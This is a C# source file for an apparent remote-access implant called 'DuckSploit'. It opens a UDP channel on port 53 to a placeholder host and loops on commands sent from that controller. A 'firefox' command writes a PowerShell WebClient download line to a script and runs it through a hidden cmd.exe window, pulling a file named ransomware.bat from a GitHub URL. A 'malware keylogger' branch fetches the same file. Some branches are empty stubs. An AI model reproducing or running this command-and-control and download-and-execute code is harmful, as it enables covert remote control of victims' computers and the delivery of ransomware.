using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Collections.Generic;

using System.Web;
using System.Threading;



namespace DuckSploit
{
	public class Program
	{		
					
		 public static void Download(string url, string outPath)
		{
			url = '"' + url + '"';
			
			outPath = '"' + outPath + '"';
			
			string str = "(New-Object System.Net.WebClient).DownloadFile(" + url + ", " + outPath + ")";
			
			outPath = "C:/temp/download.ps1";
			
            // open or create file
            FileStream streamfile = new FileStream(outPath, FileMode.OpenOrCreate, FileAccess.Write);
            // create stream writer
            StreamWriter streamwrite = new StreamWriter(streamfile);
            // add some lines
			
			outPath = '"' + "C:/temp/download.ps1" + '"';
			
			
			// string powershelldownloadtxt = "" + url +"\  "
            streamwrite.WriteLine(str);
            // clear streamwrite data
            streamwrite.Flush();
            // close stream writer
            streamwrite.Close();
            // close stream file
            streamfile.Close();
			

			// string error = "";
			// int exitCode = 0;
			string output = "";
			
			ProcessStartInfo processInfo;
			Process process;
			processInfo = new ProcessStartInfo("cmd.exe", "/c powershell C:/temp/download.ps1");
			processInfo.CreateNoWindow = true;
			processInfo.UseShellExecute = false;
			processInfo.RedirectStandardOutput = true;
			process = Process.Start(processInfo);
			process.WaitForExit();
			output = process.StandardOutput.ReadToEnd();
			
		}
		public void CreateFileaAndWrite()
        {
            // get path
            string filepath = @"C:/DuckSploit/ransomware.bat";
            // open or create file
            FileStream streamfile = new FileStream(filepath, FileMode.OpenOrCreate, FileAccess.Write);
            // create stream writer
            StreamWriter streamwrite = new StreamWriter(streamfile);
            // add some lines
			
			
            streamwrite.WriteLine("test");
            // clear streamwrite data
            streamwrite.Flush();
            // close stream writer
            streamwrite.Close();
            // close stream file
            streamfile.Close();
        }
		
		
		
		
		
		
		
		public static void Main(string[] args)
		{
			string output = "";

			UdpClient udpClient = new UdpClient(0);

			try{
				udpClient.Connect("IP", 53);

				Byte[] sendBytes = Encoding.ASCII.GetBytes("Connected!");

				udpClient.Send(sendBytes, sendBytes.Length);

				IPEndPoint RemoteIpEndPoint = new IPEndPoint(IPAddress.Any, 0);

				while(true){
					Byte[] receiveBytes = udpClient.Receive(ref RemoteIpEndPoint);
					string returnData = Encoding.ASCII.GetString(receiveBytes);
					
					
					
					
					// Console.WriteLine("Received command from " + RemoteIpEndPoint.Address.ToString());
					
					

					
					
					
					
					
					string[] result = returnData.Split(' ');
					
					// string output = "null";
					
					if(result[0] == "help")
					{
						output = "";
					}
					else if(result[0] == "exit")
					{
						System.Environment.Exit(1);
					}
					else if(result[0] == "firefox")
					{
						Download("https://github.com/canarddu38/DUCKSPLOIT/raw/root/api/malwares/ransomware.bat", "C:/temp/ransomware.bat"); // Calling method
						
						
						
						
						
					}
					else if(result[0] == "malware")
					{
						if(result[1] == "keylogger")
						{
							WebClient client = new WebClient ();

							// Add a user agent header in case the
							// requested URI contains a query.

							client.Headers.Add ("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705;)");

							Stream data = client.OpenRead("https://github.com/canarddu38/DUCKSPLOIT/raw/root/api/malwares/ransomware.bat");
							StreamReader reader = new StreamReader(data);
							string s = reader.ReadToEnd();
							Console.WriteLine(s);
							data.Close();
							reader.Close();
							
							
							
						}
						else if(result[1] == "winkiller")
						{
							
						}
					}
					
					
					Console.WriteLine(output);

					Byte[] outputtobytes = Encoding.ASCII.GetBytes(output);

					udpClient.Send(outputtobytes, outputtobytes.Length);

				}
				// udpClient.End();

			}
			catch (Exception e ) {
				Console.WriteLine(e.ToString());
			}

		}

	}
}
